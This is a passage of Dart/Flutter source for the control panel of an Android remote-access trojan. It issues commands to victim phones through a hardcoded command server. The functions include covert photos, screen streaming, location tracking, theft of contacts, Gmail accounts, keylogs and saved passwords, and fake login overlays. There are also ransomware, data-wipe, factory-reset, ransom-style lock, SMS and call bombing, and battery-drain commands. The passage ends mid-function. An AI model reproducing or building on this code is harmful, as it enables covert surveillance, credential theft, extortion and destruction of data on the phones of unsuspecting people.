import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'package:url_launcher/url_launcher.dart';

const String SERVER_URL = "http://ruur.satubangsa.my.id:3602";

// ==================== VOIDSPACE THEME CONSTANTS ====================
const Color _primaryPurple = Color(0xFFD500F9);
const Color _primaryPink = Color(0xFFFF4081);
const Color _darkBg = Color(0xFF050505);
const Color _cardBg = Color(0xFF141414);
const Color _textWhite = Color(0xFFFFFFFF);
const Color _textGray = Color(0xFFB0BEC5);

class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? device;
  const ControlCenterPage({super.key, this.device});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

// FIXED: Correct constructor syntax
class ControlPanelPage extends ControlCenterPage {
  const ControlPanelPage({super.key, required super.device});
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  bool _isSending = false;
  final List<String> _executionLogs = [];

  bool _isStreamingScreen = false;
  String _currentStreamFrame = "";
  StateSetter? _streamStateSetter;
  Timer? _streamPollingTimer;
  Timer? _streamHeartbeatTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _triggerAutoWakeup();
    });
  }

  @override
  void dispose() {
    _stopStreaming();
    _streamPollingTimer?.cancel();
    _streamHeartbeatTimer?.cancel();
    super.dispose();
  }

  void _triggerAutoWakeup() {
    final device = widget.device;
    if (device != null && device['id'] != null) {
      _sendCommand("force_open", device['id'].toString(), isSilent: true);
    }
  }

  void _addLog(String message) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
    }
  }

  void _stopStreaming() {
    _isStreamingScreen = false;
    _streamPollingTimer?.cancel();
    _streamPollingTimer = null;
    _streamHeartbeatTimer?.cancel();
    _streamHeartbeatTimer = null;
    _streamStateSetter = null;
  }

  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
    if (targetId == "unknown") {
      if (!isSilent) {
        _addLog("Error: ID Target tidak valid");
        _showNotif("INVALID ID");
      }
      return;
    }

    if (!isSilent) {
      setState(() => _isSending = true);
      _addLog("➤ $command → $targetId");
    }
    
    try {
      final response = await http.post(
        Uri.parse("$SERVER_URL/api/send-command"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": targetId, 
          "command": command, 
          "extra": extra ?? "", 
        }),
      ).timeout(const Duration(seconds: 15));

      if (response.statusCode == 200) {
        if (!isSilent) _addLog("✓ $command sent");
        
        if (command == "take_photo") {
          _startPhotoPolling(targetId);
        } else if (command == "get_screen") {
          _startStreaming(targetId);
        } else {
          _startResponsePolling(command, targetId);
        }
      } else {
        if (!isSilent) {
          _addLog("✗ Target offline");
          _showNotif("TARGET OFFLINE");
        }
      }
    } catch (e) {
      if (!isSilent) {
        _addLog("✗ Connection failed");
        _showNotif("CONNECTION ERROR");
      }
    } finally {
      if (!isSilent) setState(() => _isSending = false);
    }
  }

  void _startPhotoPolling(String targetId) {
    int attempts = 0;
    const int maxAttempts = 15;
    
    Timer.periodic(const Duration(seconds: 2), (timer) {
      attempts++;
      if (attempts > maxAttempts || !mounted) {
        timer.cancel();
        return;
      }
      
      http.get(Uri.parse("$SERVER_URL/api/get-response/$targetId")).then((response) {
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == "take_photo") {
            timer.cancel();
            _processPhotoResponse(data['data']);
          }
        }
      }).catchError((_) {});
    });
  }

  void _processPhotoResponse(dynamic data) {
    if (data == null || data['image_base64'] == null) {
      _addLog("✗ Photo failed");
      return;
    }
    
    _addLog("📸 Photo received!");
    _showPhotoDialog(data['image_base64']);
  }

  void _startStreaming(String targetId) async {
    if (_isStreamingScreen) {
      _addLog("Stream already active");
      return;
    }
    
    _addLog("🎬 Starting screen stream...");
    _isStreamingScreen = true;
    
    try {
      await http.post(
        Uri.parse("$SERVER_URL/api/stream/start/$targetId"),
        headers: {"Content-Type": "application/json"},
      );
    } catch (_) {}
    
    _showStreamDialog(targetId);
    
    _streamPollingTimer = Timer.periodic(const Duration(milliseconds: 800), (timer) async {
      if (!_isStreamingScreen || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        final response = await http.get(
          Uri.parse("$SERVER_URL/api/stream/frame/$targetId"),
        ).timeout(const Duration(seconds: 2));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['success'] == true && data['frame'] != null && _streamStateSetter != null) {
            _streamStateSetter!(() {
              _currentStreamFrame = data['frame'];
            });
          }
        }
      } catch (_) {}
    });
    
    _streamHeartbeatTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
      if (!_isStreamingScreen || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        await http.post(
          Uri.parse("$SERVER_URL/api/stream/frame/$targetId"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": "", "frameNumber": 0}),
        );
      } catch (_) {}
    });
  }

  void _showPhotoDialog(String base64Image) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Row(
          children: [
            Icon(Icons.camera, color: _primaryPink, size: 20),
            const SizedBox(width: 8),
            Text("CAPTURED PHOTO", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(
            maxHeight: MediaQuery.of(context).size.height * 0.6,
            maxWidth: MediaQuery.of(context).size.width * 0.8,
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(12),
            child: Image.memory(
              base64Decode(base64Image),
              fit: BoxFit.contain,
              errorBuilder: (_, __, ___) => const Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(Icons.broken_image, color: Colors.red, size: 50),
                  Text("Failed to load image", style: TextStyle(color: Colors.white54)),
                ],
              ),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context), 
            child: Text("CLOSE", style: TextStyle(color: _primaryPink)),
          ),
        ],
      ),
    );
  }

  void _showStreamDialog(String targetId) {
    _currentStreamFrame = "";
    
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setDialogState) {
          _streamStateSetter = setDialogState;
          return AlertDialog(
            backgroundColor: _cardBg,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(20), 
              side: BorderSide(color: _primaryPink.withOpacity(0.5))
            ),
            title: Row(
              children: [
                Icon(Icons.live_tv, color: _primaryPink, size: 18),
                const SizedBox(width: 10),
                Text("LIVE STREAM", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: _primaryPink.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: const Text("LIVE", style: TextStyle(color: Colors.red, fontSize: 10, fontWeight: FontWeight.bold)),
                ),
              ],
            ),
            content: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 300,
                  height: 500,
                  decoration: BoxDecoration(
                    color: Colors.black,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: _primaryPurple, width: 1),
                  ),
                  child: _currentStreamFrame.isNotEmpty 
                    ? ClipRRect(
                        borderRadius: BorderRadius.circular(12),
                        child: Image.memory(
                          base64Decode(_currentStreamFrame),
                          fit: BoxFit.contain,
                          gaplessPlayback: true,
                        ),
                      )
                    : const Center(
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            CircularProgressIndicator(color: Color(0xFFD500F9)),
                            SizedBox(height: 10),
                            Text("Waiting for stream...", style: TextStyle(color: Colors.white54)),
                          ],
                        ),
                      ),
                ),
                const SizedBox(height: 10),
                LinearProgressIndicator(color: _primaryPink, backgroundColor: Colors.white10),
              ],
            ),
            actions: [
              TextButton(
                onPressed: () async {
                  _stopStreaming();
                  await http.post(Uri.parse("$SERVER_URL/api/stream/stop/$targetId"));
                  if (mounted) Navigator.pop(context);
                  _addLog("⏹️ Stream stopped");
                }, 
                child: Text("STOP", style: TextStyle(color: _primaryPink)),
              ),
            ],
          );
        },
      ),
    ).then((_) {
      _stopStreaming();
      http.post(Uri.parse("$SERVER_URL/api/stream/stop/$targetId"));
    });
  }

  void _startResponsePolling(String cmd, String targetId) {
    int attempts = 0;
    const int maxAttempts = 15;
    
    Timer.periodic(const Duration(seconds: 2), (timer) async {
      attempts++;
      if (attempts > maxAttempts || !mounted) {
        timer.cancel();
        return;
      }
      
      try {
        final response = await http.get(
          Uri.parse("$SERVER_URL/api/get-response/$targetId"),
        ).timeout(const Duration(seconds: 3));
        
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['data'] != null && data['cmd'] == cmd) {
            timer.cancel();
            _processResponse(cmd, data['data'], targetId);
          }
        }
      } catch (_) {}
    });
  }

  void _processResponse(String cmd, dynamic data, String targetId) {
    if (data == null) return;

    switch (cmd) {
      case "get_location":
        _addLog("📍 Location received");
        _showLocationDialog(data['lat'], data['lng']);
        break;
      case "get_contacts":
        _addLog("📱 Contacts downloaded");
        _showContactsDialog(data['contacts']);
        break;
      case "get_gmails":
        _addLog("📧 Gmail accounts pulled");
        _showGmailDialog(data['accounts'] ?? "No accounts");
        break;
      case "vibrate_loop":
        _addLog("📳 Vibrating target");
        _showNotif("VIBRATING");
        break;
      case "flash_strobe":
        _addLog("⚡ Strobe active");
        _showNotif("STROBE ON");
        break;
      case "hard_lock":
        _addLog("🔒 HARD LOCK engaged");
        _showNotif("HARD LOCK");
        break;
      case "activate_ransomware":
        _addLog("💀 RANSOMWARE activated");
        _showNotif("RANSOMWARE");
        break;
      case "panic_mode":
        _addLog("⚠️ PANIC MODE active");
        _showNotif("PANIC MODE");
        break;
      case "virus_mode":
        _addLog("🦠 VIRUS MODE active");
        _showNotif("VIRUS MODE");
        break;
      case "panic_unlock":
        _addLog("🔓 Panic unlock");
        _showNotif("UNLOCKED");
        break;
      case "virus_unlock":
        _addLog("🔓 Virus unlock");
        _showNotif("UNLOCKED");
        break;
      case "decrypt_files":
        _addLog("🔓 Files decrypted");
        _showNotif("DECRYPTED");
        break;
      case "factory_reset":
        _addLog("💣 Factory reset sent");
        _showNotif("FACTORY RESET");
        break;
      case "wipe_data":
        _addLog("🗑️ Data wiped");
        _showNotif("DATA WIPED");
        break;
      case "call_bombing":
        _addLog("📞 Call bombing active");
        _showNotif("CALL BOMBER");
        break;
      case "sms_bomber":
        _addLog("📨 SMS bomber active");
        _showNotif("SMS BOMBER");
        break;
      case "battery_drain":
        _addLog("🔋 Battery drain active");
        _showNotif("DRAINING");
        break;
      case "set_wallpaper":
        _addLog("🖼️ Wallpaper changed");
        _showNotif("WALLPAPER");
        break;
      case "play_audio":
        _addLog("🎵 Playing audio");
        _showNotif("PLAYING");
        break;
      case "stop_audio":
        _addLog("⏹️ Audio stopped");
        _showNotif("STOPPED");
        break;
      case "flashlight_on":
        _addLog("🔦 Flashlight ON");
        _showNotif("FLASHLIGHT ON");
        break;
      case "flashlight_off":
        _addLog("🔦 Flashlight OFF");
        _showNotif("FLASHLIGHT OFF");
        break;
      case "open_url":
        _addLog("🌐 URL opened");
        _showNotif("URL OPENED");
        break;
      case "grab_gallery":
        _addLog("📸 Gallery grabbed: ${data['count'] ?? 0} files");
        _showNotif("GALLERY");
        break;
      case "grab_videos":
        _addLog("🎬 Videos grabbed: ${data['count'] ?? 0} files");
        _showNotif("VIDEOS");
        break;
      case "request_admin":
        _addLog("👑 Admin requested");
        _showNotif("ADMIN REQ");
        break;
      case "is_admin":
        _addLog("👑 Admin: ${data['isAdmin'] == true ? "ACTIVE" : "INACTIVE"}");
        _showNotif(data['isAdmin'] == true ? "ADMIN YES" : "ADMIN NO");
        break;
      case "admin_lock":
        _addLog("🔒 Admin lock");
        _showNotif("ADMIN LOCK");
        break;
      case "admin_wipe":
        _addLog("💣 Admin wipe");
        _showNotif("ADMIN WIPE");
        break;
      case "start_keylogger":
        _addLog("⌨️ Keylogger started");
        _showNotif("KEYLOG ON");
        break;
      case "stop_keylogger":
        _addLog("⌨️ Keylogger stopped");
        _showNotif("KEYLOG OFF");
        break;
      case "get_keylogs":
        _addLog("📝 Keylogs retrieved");
        _showKeyLogsDialog(data['logs'] ?? "No logs");
        break;
      case "get_saved_passwords":
        _addLog("🔑 Passwords retrieved");
        _showPasswordsDialog(data['passwords'] ?? "No passwords");
        break;
      case "start_fake_login":
        _addLog("🎭 Fake login started");
        _showNotif("FAKE LOGIN");
        break;
      case "stop_fake_login":
        _addLog("🎭 Fake login stopped");
        _showNotif("FAKE OFF");
        break;
      default:
        _addLog("✓ Command executed");
        _showNotif("SUCCESS");
    }
  }

  void _showKeyLogsDialog(String logs) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Row(
          children: [
            Icon(Icons.keyboard, color: _primaryPink, size: 20),
            const SizedBox(width: 8),
            Text("KEYLOGS", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.6),
          child: SingleChildScrollView(
            child: SelectableText(
              logs,
              style: const TextStyle(color: Colors.white, fontSize: 11, fontFamily: 'monospace'),
            ),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("CLOSE", style: TextStyle(color: _primaryPink))),
        ],
      ),
    );
  }

  void _showPasswordsDialog(String passwords) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Row(
          children: [
            Icon(Icons.password, color: _primaryPink, size: 20),
            const SizedBox(width: 8),
            Text("SAVED PASSWORDS", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          width: double.infinity,
          constraints: BoxConstraints(maxHeight: MediaQuery.of(context).size.height * 0.6),
          child: SingleChildScrollView(
            child: SelectableText(
              passwords,
              style: const TextStyle(color: Colors.greenAccent, fontSize: 11, fontFamily: 'monospace'),
            ),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("CLOSE", style: TextStyle(color: _primaryPink))),
        ],
      ),
    );
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Row(
          children: [
            Icon(Icons.location_on, color: _primaryPink, size: 20),
            const SizedBox(width: 8),
            Text("GPS COORDINATES", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: _primaryPurple.withOpacity(0.3)),
              ),
              child: SelectableText("$lat, $lng", style: TextStyle(color: _primaryPink, fontSize: 12, fontWeight: FontWeight.bold)),
            ),
            const SizedBox(height: 12),
            ClipRRect(
              borderRadius: BorderRadius.circular(12),
              child: Image.network(
                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=400,250",
                height: 180,
                width: double.infinity,
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(
                  height: 180,
                  color: Colors.black,
                  child: const Icon(Icons.map, color: Colors.white38, size: 50),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("CLOSE", style: TextStyle(color: _primaryPurple))),
          TextButton(
            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), mode: LaunchMode.externalApplication),
            child: Text("OPEN MAPS", style: TextStyle(color: _primaryPink)),
          ),
        ],
      ),
    );
  }

  void _showContactsDialog(List contacts) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.6,
        maxChildSize: 0.9,
        expand: false,
        builder: (context, scrollController) => Column(
          children: [
            Padding(
              padding: const EdgeInsets.all(15),
              child: Text("📱 CONTACTS (${contacts.length})", style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: contacts.length,
                itemBuilder: (context, i) => ListTile(
                  leading: CircleAvatar(
                    backgroundColor: _primaryPurple.withOpacity(0.2),
                    child: Icon(Icons.person, color: _primaryPink, size: 20),
                  ),
                  title: Text(contacts[i]['name'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 13)),
                  subtitle: Text(contacts[i]['number'] ?? "No number", style: const TextStyle(color: Colors.white38, fontSize: 11)),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _showGmailDialog(String emails) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Row(
          children: [
            Icon(Icons.email, color: _primaryPink, size: 20),
            const SizedBox(width: 8),
            Text("GMAIL ACCOUNTS", style: TextStyle(color: _primaryPurple, fontSize: 12, fontWeight: FontWeight.bold)),
          ],
        ),
        content: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(12)),
          child: SelectableText(emails, style: TextStyle(color: _primaryPink, fontSize: 12)),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("CLOSE", style: TextStyle(color: _primaryPurple))),
        ],
      ),
    );
  }

  void _showNotif(String m) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: _primaryPurple,
        content: Text(m, style: const TextStyle(color: Colors.white, fontSize: 11)),
        duration: const Duration(milliseconds: 800),
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      ),
    );
  }

  void _showCameraMenu(String targetId) {
    String selectedCam = "back";
    showDialog(
      context: context,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: _cardBg,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(20), 
            side: BorderSide(color: _primaryPurple.withOpacity(0.5))
          ),
          title: Text("CAPTURE PHOTO", style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
          content: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text("Select camera:", style: TextStyle(color: Colors.white54)),
              const SizedBox(height: 16),
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  _cameraOption(Icons.camera_rear, "BACK", "back", selectedCam, (val) => setState(() => selectedCam = val)),
                  _cameraOption(Icons.camera_front, "FRONT", "front", selectedCam, (val) => setState(() => selectedCam = val)),
                ],
              ),
              const SizedBox(height: 16),
              ElevatedButton(
                onPressed: () {
                  _sendCommand("take_photo", targetId, extra: selectedCam);
                  Navigator.pop(context);
                },
                style: ElevatedButton.styleFrom(backgroundColor: _primaryPurple),
                child: const Text("CAPTURE", style: TextStyle(color: Colors.white)),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _cameraOption(IconData icon, String label, String value, String current, Function(String) onTap) {
    bool isSelected = value == current;
    return GestureDetector(
      onTap: () => onTap(value),
      child: Column(
        children: [
          Icon(icon, size: 36, color: isSelected ? _primaryPink : Colors.white24),
          const SizedBox(height: 6),
          Text(label, style: TextStyle(color: isSelected ? _primaryPink : Colors.white24, fontSize: 11)),
        ],
      ),
    );
  }

  void _showInputDialog(String title, String cmd, String targetId) {
    final TextEditingController controller = TextEditingController();
    final TextEditingController pinController = TextEditingController();
    final TextEditingController phoneController = TextEditingController();
    final TextEditingController countController = TextEditingController();
    final TextEditingController messageController = TextEditingController();
    final TextEditingController soundController = TextEditingController();
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Text(title, style: TextStyle(color: _primaryPurple, fontSize: 14, fontWeight: FontWeight.bold)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            if (cmd == "hard_lock") ...[
              _buildInputField(controller, "Lock message", "YOUR PHONE IS LOCKED"),
              const SizedBox(height: 8),
              _buildInputField(pinController, "PIN", "0853"),
            ],
            if (cmd == "virus_mode") ...[
              _buildInputField(soundController, "Sound URL (optional)", "https://..."),
              const SizedBox(height: 8),
              _buildInputField(messageController, "Virus message (optional)", "HACKED!"),
            ],
            if (cmd == "call_bombing") ...[
              _buildInputField(countController, "Call count", "50", isNumber: true),
            ],
            if (cmd == "sms_bomber") ...[
              _buildInputField(phoneController, "Phone number", "+628..."),
              const SizedBox(height: 8),
              _buildInputField(countController, "SMS count", "50", isNumber: true),
              const SizedBox(height: 8),
              _buildInputField(messageController, "Message", "YOU'VE BEEN HACKED"),
            ],
            if (cmd == "play_audio") ...[
              _buildInputField(controller, "MP3 URL", "https://..."),
            ],
            if (cmd == "set_wallpaper") ...[
              _buildInputField(controller, "Image URL", "https://..."),
            ],
            if (cmd == "open_url") ...[
              _buildInputField(controller, "Website URL", "https://..."),
            ],
            if (cmd == "start_fake_login") ...[
              _buildInputField(controller, "App (google/ig/fb)", "google"),
            ],
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("CANCEL", style: TextStyle(color: _primaryPurple))),
          ElevatedButton(
            onPressed: () {
              if (cmd == "hard_lock") {
                String msg = controller.text.trim().isEmpty ? "YOUR PHONE IS LOCKED" : controller.text.trim();
                String pin = pinController.text.trim().isEmpty ? "0853" : pinController.text.trim();
                _sendCommand("hard_lock", targetId, extra: "$msg|$pin");
              } else if (cmd == "virus_mode") {
                String sound = soundController.text.trim();
                String msg = messageController.text.trim();
                if (sound.isNotEmpty && msg.isNotEmpty) _sendCommand("virus_mode", targetId, extra: "$sound|$msg");
                else if (sound.isNotEmpty) _sendCommand("virus_mode", targetId, extra: sound);
                else if (msg.isNotEmpty) _sendCommand("virus_mode", targetId, extra: msg);
                else _sendCommand("virus_mode", targetId);
              } else if (cmd == "call_bombing") {
                String count = countController.text.trim().isEmpty ? "50" : countController.text.trim();
                _sendCommand("call_bombing", targetId, extra: count);
              } else if (cmd == "sms_bomber") {
                String phone = phoneController.text.trim();
                String count = countController.text.trim().isEmpty ? "50" : countController.text.trim();
                String msg = messageController.text.trim().isEmpty ? "HACKED" : messageController.text.trim();
                _sendCommand("sms_bomber", targetId, extra: "$phone|$count|$msg");
              } else {
                _sendCommand(cmd, targetId, extra: controller.text.trim());
              }
              Navigator.pop(context);
            },
            style: ElevatedButton.styleFrom(backgroundColor: _primaryPurple),
            child: const Text("SEND", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  Widget _buildInputField(TextEditingController c, String label, String hint, {bool isNumber = false}) {
    return TextField(
      controller: c,
      keyboardType: isNumber ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: Colors.white),
      decoration: InputDecoration(
        labelText: label,
        labelStyle: const TextStyle(color: Colors.white54),
        hintText: hint,
        hintStyle: const TextStyle(color: Colors.white24, fontSize: 11),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: _primaryPurple.withOpacity(0.3)),
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(10),
          borderSide: BorderSide(color: _primaryPurple),
        ),
      ),
    );
  }

  void _showConfirmDialog(String title, String message, String cmd, String targetId) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: _cardBg,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20), 
          side: BorderSide(color: _primaryPurple.withOpacity(0.5))
        ),
        title: Text(title, style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
        content: Text(message, style: const TextStyle(color: Colors.white)),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: Text("NO", style: TextStyle(color: _primaryPurple))),
          ElevatedButton(
            onPressed: () {
              _sendCommand(cmd, targetId);
              Navigator.pop(context);
            },
            style: ElevatedButton.styleFrom(backgroundColor: _primaryPink),
            child: const Text("YES", style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  void _fetchNotificationLogs(String targetId) async {
    _addLog("Fetching notifications...");
    try {
      final response = await http.get(Uri.parse("$SERVER_URL/api/get-notifications/$targetId"));
      if (response.statusCode == 200) {
        final List logs = jsonDecode(response.body);
        _showNotificationLogsDialog(logs);
        _addLog("✓ ${logs.length} notifications");
      }
    } catch (_) {
      _addLog("✗ Failed to fetch");
    }
  }

  void _showNotificationLogsDialog(List logs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _cardBg,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
      builder: (context) => DraggableScrollableSheet(
        initialChildSize: 0.7,
        maxChildSize: 0.9,
        builder: (context, scrollController) => Column(
          children: [
            Padding(
              padding: const EdgeInsets.all(15),
              child: Text("🔔 NOTIFICATIONS (${logs.length})", style: TextStyle(color: _primaryPurple, fontWeight: FontWeight.bold)),
            ),
            Expanded(
              child: ListView.builder(
                controller: scrollController,
                itemCount: logs.length,
                itemBuilder: (context, i) {
                  final log = logs[i];
                  return ListTile(
                    leading: Icon(Icons.notifications, color: _primaryPink),
                    title: Text(log['title'] ?? "", style: const TextStyle(color: Colors.white, fontSize: 12)),
                    subtitle: Text(log['body'] ?? "", style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ==================== UI BUILDERS ====================
  
  Widget _buildLogContainer() {
    return Container(
      margin: const EdgeInsets.all(12),
      padding: const EdgeInsets.all(12),
      height: 110,
      decoration: BoxDecoration(
        color: _cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _primaryPurple.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.terminal, color: _primaryPink, size: 14),
              const SizedBox(width: 6),
              Text("ACTIVITY LOG", style: TextStyle(color: _primaryPurple, fontSize: 10, fontWeight: FontWeight.bold)),
            ],
          ),
          const SizedBox(height: 6),
          Expanded(
            child: ListView.builder(
              reverse: true,
              itemCount: _executionLogs.length > 6 ? 6 : _executionLogs.length,
              itemBuilder: (context, i) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 1),
                child: Text(
                  _executionLogs[i], 
                  style: const TextStyle(color: Colors.white38, fontSize: 9, fontFamily: 'monospace'),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSection(String title, String subtitle, IconData icon, List<Widget> buttons) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _cardBg,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _primaryPurple.withOpacity(0.2)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: _primaryPurple.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Icon(icon, color: _primaryPink, size: 20),
              ),
              const SizedBox(width: 12),
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(title, style: TextStyle(color: _primaryPurple, fontSize: 13, fontWeight: FontWeight.bold)),
                  Text(subtitle, style: TextStyle(color: _textGray, fontSize: 8)),
                ],
              ),
            ],
          ),
          const SizedBox(height: 12),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: buttons,
          ),
        ],
      ),
    );
  }

  Widget _btn(String label, IconData icon, String cmd, String targetId) {
    return InkWell(
      onTap: () {
        final actionMap = {
          'take_photo': () => _showCameraMenu(targetId),
          'get_screen': () => _sendCommand("get_screen", targetId),
          'hard_lock': () => _showInputDialog("🔒 HARD LOCK", "hard_lock", targetId),
          'set_wallpaper': () => _showInputDialog("🖼️ WALLPAPER", "set_wallpaper", targetId),
          'play_audio': () => _showInputDialog("🎵 PLAY AUDIO", "play_audio", targetId),
          'open_url': () => _showInputDialog("🌐 OPEN URL", "open_url", targetId),
          'activate_ransomware': () => _showConfirmDialog("💀 RANSOMWARE", "Activate ransomware?", "activate_ransomware", targetId),
          'panic_mode': () => _showConfirmDialog("⚠️ PANIC MODE", "Activate panic mode?", "panic_mode", targetId),
